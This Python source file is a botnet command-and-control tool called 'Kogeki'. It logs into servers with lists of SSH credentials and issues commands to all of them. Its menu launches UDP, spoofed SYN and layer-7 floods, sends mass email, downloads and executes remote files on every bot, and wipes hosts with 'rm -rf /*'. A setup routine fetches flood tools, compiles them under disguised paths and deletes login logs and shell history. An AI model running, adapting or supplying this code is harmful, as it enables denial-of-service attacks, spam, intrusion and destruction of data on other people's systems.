from colorama import Fore, Style
from pexpect import pxssh
from time import sleep
from os import system
from datetime import datetime

import sockets, subprocess, sys, getpass, signal, requests, random

botnet = []
bots = 0
global cmd
cmd = None

webhook = "https://discordapp.com/api/webhooks/---------/-------------" #edit this if you want to recieve webhook notifications on failed logins

class Bot:

    # initialize new client
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()


    # secure shell into client
    def ssh(self):
        try:
          bot = pxssh.pxssh()
        except Exception:
          print('Connection failure.')
        else:
          bot.login(self.host, self.user, self.password, sync_multiplier=5, auto_prompt_reset=False)
          return bot

    # send command to client
    def send_command(self, cmd):
        try:
          self.session.sendline(cmd)
          self.session.prompt()
          return self.session.before
        except Exception:
          pass
        
        


# send a command to all bots in the botnet
def command_bots(command):
    for bot in botnet:
        try:
          attack = bot.send_command(command)
          results = attack.decode('utf-8').strip(cmd)
          print()
          print('Response from ' + bot.host)
          print(results)
          print("-------------------------------")
        except Exception:
          print(Fore.RED + "The command has failed on {}".format(bot.host))

def command_botz(command):
    for bot in botnet:
        try:
          attack = bot.send_command(command)
          results = attack.decode('utf-8').strip(cmd)
        except Exception:
          print(Fore.RED + "The command has failed on {}".format(bot.host))

# list of bots in botnet
botnet = []

# add a new bot to your botnet
def add_bot(host, user, password):
  try:
    new_bot = Bot(host, user, password)
  except Exception as e:
    print(Fore.RED + host + Fore.RED + " has encountered an error and could not be scanned!")
    print(e)
  else:
    botnet.append(new_bot)
    print(Fore.YELLOW + host + Fore.RED + " has been scanned to the botnet!")
    
def scan(filename):
  try:
    with open(filename, "r") as ff:
      for line in ff:
        stuff = line.strip().split("~")
        ip = stuff[-1]
        password = stuff[1]
        username = stuff[0]
        add_bot(ip, username, password)
        bot.sendline(ddoscommands)
        bot.sendline('apt-get install netcat -y;apt-get install nc -y;yum install nc -y;yum install netcat -y')
  except Exception:
    print("There was an error scanning " + filename)

system('clear')

banner = str('''
                           __ __              __    _ 
                          / //_/__  ___ ____ / /__ (_)
                         / ,< / _ \/ _ `/ -_)  '_// / 
                        /_/|_|\___/\_, /\__/_/\_\/_/  
                                   /___/               
''')

helpmenu = str('''
Kogeki Botnet Commands

help [brings you here]

~Basic Commands~

exec <command> [Sends a command to all connected bots]
root <ip>~<user>~<password> [attempts to root a server to your botnet]
scan <filename> [scan your infect file to the botnet] [format ip~username~password]
email [send a mass email from all bots] ~INTERACTIVE COMMAND~
rules [shows botnet rules] 

~DDoS Commands~

[LAYER 4]

udp [forces all connected bots to send a strong udp flood to a host] ~INTERACTIVE COMMAND~
tcp [forces all connected bots to send a strong, spoofed tcp-syn flood to a host] ~INTERACTIVE COMMAND~
sudp [forces all connected bots to send a spoofed udp flood to a host] ~INTERACTIVE COMMAND~

[LAYER 7]

rand [forces all connected hosts to send a RAND L7 flood to a host] ~INTERACTIVE COMMAND~

ddossetup [sets up all bots to launch ddos attacks]
killattk [kills all ongoing attacks]

~Other~

download <url>~<path> [downloads a file from the internet to a specified path and runs it on all bots] [note: having an extention on the file could cause it to bug]
ruin [wipes all bots with a rm -rf /*]
''')

rules = str('''
Kogeki Rules

1. Don't Break the Law
2. Learn Things
3. Have Fun!

''')
global ddoscommands
ddoscommands = str('''
apt-get install python3 -y
apt-get install nohup -y
apt-get install python3-pip -y
apt-get install python -y
apt-get install python-pip -y
apt-get install gcc -y
yum install python3 -y
yum install nohup -y
yum install python3-pip -y
yum install python -y
yum install python-pip -y
yum install gcc -y
wget https://pastebin.com/raw/b61eqYxw -O /usr/share/adduser/users.log
wget https://raw.githubusercontent.com/cyberhubarchive/archive/master/Stress%20Testing/TCP/syn.c -O /dev/nuii.c
gcc /dev/nuii.c -o /dev/noll -pthread
rm -rf /dev/nuii.c
wget https://github.com/PraneethKarnena/DDoS-Scripts/blob/master/Layer-4/Spoofed-UDP/sudp.c -O /usr/share/sudp.c
gcc /usr/share/sudp.c -o sudp -pthread
wget https://raw.githubusercontent.com/PraneethKarnena/DDoS-Scripts/master/Layer-7/Rand/rand.pl -O /usr/lib/rand.pl
pip2 install re
pip2 install random
pip2 install sys
pip2 install threading
pip3 install urllib3
pip3 install re
pip3 install random
pip3 install sys
pip3 install threading
ulimit -n 99999
rm -rf /var/log/lastlog
rm -rf /root/.bash_history
''')

global username, password
print(Fore.RED + banner)
username = str(input(Fore.RED + "Username" + Fore.YELLOW + ":")).strip()
password = str(getpass.getpass(Fore.RED + "Password" + Fore.YELLOW + ":")).strip()

def makefiles():
  pass
  
def login():
  with open("auth.txt", "r") as f:
    for line in f:
      loginInfo = line.strip().split(",")
      if username == loginInfo[0] and password == loginInfo[1]:
        return True
    return False
    
def scan(filename):
  with open(filename, "r") as ff:
    for line in ff:
      try:
        stuff = line.strip().split("~")
        ip = stuff[-1]
        password = stuff[1]
        username = stuff[0]
        add_bot(ip, username, password)
      except Exception:
        pass
        
def scanprocess():
  try:
    scan('yuko.kogeki')
  except Exception:
    print("We encountered an error scanning a file! Please append your lists to your yuko file!")
    pass
    
def singleroot():
  try:
    stuff = cmd.replace("root ", "").strip().split("~")
    ip = stuff[-1]
    password = stuff[1]
    username = stuff[0]
    print(Fore.YELLOW + "Attempting to scan " + ip + " to the botnet!")
    print("Username: " + username + "\n" + "Password: " + password +  "\n")
    add_bot(ip, username, password)
  except Exception:
    print("There was an error with your format")
    
def ctrlc(signal, frame):
  pass
signal.signal(signal.SIGINT, ctrlc)

def ctrlz(signum, frame):
  pass
   
signal.signal(signal.SIGTSTP, ctrlz)

def email():
  email = input(Fore.YELLOW + 'To: ')
  subject = input(Fore.YELLOW + 'Subject: ')
  body = input(Fore.YELLOW + 'Body: ')
  send = "echo '{}' | mail -s '{}' {}".format(body, subject, email)
  command_botz(send)
  
def ruin():
  try:
    s = pxssh.pxssh()
    stuff = cmd.strip().strip("ruin ").split("~")
    ip = stuff[-1]
    password = stuff[1]
    username = stuff[0]
    s.login(ip, username, password)
    s.sendline('rm -rf /*')
  except Exception:
    print("There was an error with your format")

def ddossetup():
  for bot in botnet:
    try:
      attack = bot.send_command(ddoscommands)
      results = attack.decode('utf-8').strip(cmd)
      print(bot.host + " is being setup for ddos. Please allow 3-5 minutes for the entire process to complete! (for all servers as a whole)")
    except Exception as e:
      print(Fore.RED + "The command has failed on {}".format(bot.host))
      print(e)
    

if login():
    system('clear')
    sleep(.4)
    print(banner)
    sleep(.4)
    print(Fore.YELLOW + "Welcome" + Fore.RED + " " + username + Fore.RESET)
    print()
    scanprocess()
    print()
    cmd = input(Fore.YELLOW + username + Fore.RED + "~" + Fore.YELLOW + "Kogeki (Press Enter To Confirm Action)" + Fore.RED + "~ ")
    print()
    while cmd != "logout" or cmd != "quit" or cmd != "leave" or cmd != "exit" or cmd != "q":
      cmd = input(Fore.YELLOW + username + Fore.RED + "~" + Fore.YELLOW + "Kogeki " + Fore.RED + "~ ")
      if cmd == "help" or cmd == "HELP" or cmd == "?" or cmd == "COMMANDS" or cmd == "commands":
        print(helpmenu)
      elif "exec" in cmd:
        send = cmd.strip('exec ')
        command_bots(send)  
      elif cmd == "cls" or cmd == "clear" or cmd == "erase":
        system("clear")
        print(banner)
      elif cmd == "logout" or cmd == "exit" or cmd == "quit" or cmd == "leave":
        sys.exit()
      elif cmd == "" or cmd == " ":
        pass
      elif cmd[:5] == "scan ":
        filename = cmd.strip(cmd[:5])
        scan(filename)
      elif "crypt" in cmd:
        print(1)
      elif cmd[:5] == "root ":
        singleroot()
      elif cmd == "rules":
        print(Fore.YELLOW + rules)
      elif cmd[:5] == "ruin ":
        ruin()
      elif cmd[:9] == "ddossetup":
        ddossetup()
      elif cmd[:3] == "udp":
        ip = input(Fore.YELLOW + "Host: ")
        port = input(Fore.YELLOW + "Port: ")
        time = input(Fore.YELLOW + "Time (Seconds): ")
        data = 'screen -dm python3 /usr/share/adduser/users.log {} {} 1025 {}'.format(ip, port, time)
        try:
          command_botz(data)
        except:
          print(Fore.RED + "Attack failed!")
        else:
          print(Fore.GREEN + "Command has been sent to all bots! [HOST: {}, PORT: {}, TIME: {}]".format(ip, port, time))
      elif cmd[:3] == "tcp":
        ip = input(Fore.YELLOW + "Host: ")
        port = input(Fore.YELLOW + "Port: ")
        time = input(Fore.YELLOW + "Time (Seconds): ")
        data = 'screen -dm /dev/noll {} {} {}'.format(ip, port, time)
        try:
          command_botz(data)
        except:
          print(Fore.RED + "Attack failed!")
        else:
          print(Fore.GREEN + "Command has been sent to all bots! [HOST: {}, PORT: {}, TIME: {}]".format(ip, port, time))
      elif cmd[:4] == "sudp":
        ip = input(Fore.YELLOW + "Host: ")
        port = input(Fore.YELLOW + "Port: ")
        time = input(Fore.YELLOW + "Time (Seconds): ")
        data = 'screen -dm /usr/include/sudp {} {} 2 1000 {}'.format(ip, port, time)
        try:
          command_botz(data)
        except:
          print(Fore.RED + "Attack failed!")
        else:
          print(Fore.GREEN + "Command has been sent to all bots! [HOST: {}, PORT: {}, TIME: {}]".format(ip, port, time))
        print(Fore.GREEN + "Command has been sent to all bots! [HOST: {}, PORT: {}, TIME: {}]".format(ip, port, time))
      elif cmd[:4] == "rand":
        ip = input(Fore.YELLOW + "Website or Website IP: ")
        time = input(Fore.YELLOW + "Time (Seconds): ")
        data = 'screen -dm perl /usr/lib/rand.pl {} {}'.format(ip, time)
        try:
          command_botz(data)
        except:
          print(Fore.RED + "Attack failed!")
        else:
          print(Fore.GREEN + "Command has been sent to all bots! [HOST: {}, TIME: {}]".format(ip, time))
      elif cmd[:8] == "killattk":
        command_botz('pkill screen')
        print(Fore.YELLOW + "All attacks were killed!")
      elif cmd[:5] == "email":
        email()
      elif cmd[:9] == "download ":
        txt = cmd.strip('download ').split("~")
        command_botz("wget {} -O {};chmod 777 {};./{}".format(txt[0], txt[1], txt[0], txt[0]))
      else:
        print(helpmenu)
else:
    print(Fore.RED + 'Authed Failed. Attempt logged!')
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    results = str("""
        ```css
        Kogeki Logs [FAILED LOGIN]

        |Info|

        Time: """ + date + """
        Username: """ + username + """
        Password: """ + password + """
        
        |Recommendations|
        
        Review server logs!
        
        ```
    """)
    requests.post(webhook, {
    'username': "Kogeki Failed Login",
    'content': results,
    'avatar_url': 'http://backgrounds4k.net/wp-content/uploads/2016/03/Red-Abstract-widescreen.jpg',
    })
    sys.exit()
